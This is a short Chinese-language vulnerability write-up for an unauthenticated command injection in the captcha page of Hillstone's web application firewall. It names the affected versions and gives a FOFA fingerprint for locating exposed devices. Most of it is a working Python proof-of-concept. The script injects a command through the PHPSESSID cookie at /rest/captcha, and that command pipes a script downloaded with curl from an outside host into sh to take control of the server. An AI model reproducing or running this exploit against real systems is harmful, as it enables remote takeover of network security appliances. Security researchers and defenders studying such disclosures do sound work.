# 山石网科应用防火墙WAF未授权命令注入漏洞

山石网科 Web 应用防火墙（WAF）是专业智能的Web 应用安全防护产品，在Web资产发现、漏洞评估、流量学习、威胁定位等方面全面应用智能分析和语义分析技术，帮助用户轻松应对应用层风险，确保网站全天候的安全运营。

在WAF的验证码页面，存在命令注入漏洞，恶意攻击者可通过构造恶意请求，拼接命令执行任意代码，控制服务器。

**受影响版本:**
5.5R6-2.6.7~5.5R6-2.8.13

## fofa

```yaml
icon_hash="-839455805"
```

## poc

```python
import requests,sys
requests.packages.urllib3.disable_warnings()
session = requests.Session()

target = "https://192.168.247.196/".strip("/")
cmd="curl\x24{IFS}192.168.247.1:9999/cccc|sh"
url = target+"/rest/captcha"
headers = {"Accept":"*/*","User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)","Accept-Language":"en;q=0.9"}
sss=requests.get(url,headers=headers,verify=False)

if "PNG" not  in sss.content:
    print("target not vuln")
    sys.exit()




cookies = {"PHPSESSID":"aaaaaaaaaa%3b"+cmd+"%3bd"}
try:
    response = session.get(target+"/rest/captcha", headers=headers, cookies=cookies,verify=False,timeout=5)
except requests.exceptions.ReadTimeout:
    print("payload work")
    sys.exit()

print("payload send!")
```

